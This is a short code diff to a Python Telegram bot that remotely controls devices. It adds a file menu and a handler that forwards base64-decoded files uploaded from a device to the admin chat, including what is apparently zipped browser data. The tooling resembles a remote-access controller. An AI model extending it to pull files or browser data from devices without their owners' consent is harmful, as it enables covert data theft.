@@ -458,6 +458,7 @@ class ServerBot:
                 text="Введите свою комбинацию клавиш (например: ctrl+shift+esc):")
         elif action == "system_menu":
             keyboard = [
+                [InlineKeyboardButton("📁 Файлы", callback_data=f"action_{device_id}_files_menu")],
                 [InlineKeyboardButton("💻 Командная строка", callback_data=f"action_{device_id}_cmd_menu")],
                 [InlineKeyboardButton("📜 Список процессов", callback_data=f"action_{device_id}_processes")],
                 [InlineKeyboardButton("❌ Завершить процесс", callback_data=f"action_{device_id}_killprocess")],
@@ -884,6 +885,14 @@ async def command_result(request: Request):
             chat_id=ADMIN_IDS[0],
             text="Список окон:",
             reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+    elif file_type == 'file':
+        file_bytes = base64.b64decode(file_data)
+        await bot_instance.application.bot.send_document(
+            chat_id=ADMIN_IDS[0],
+            document=file_bytes,
+            filename=f"download_{device_id}.zip" if 'браузера' in result else os.path.basename(result.split()[-1]),
+            caption=f"Результат с устройства {device_id}\n\n{result}"
         )
     else:
         if bot_instance:
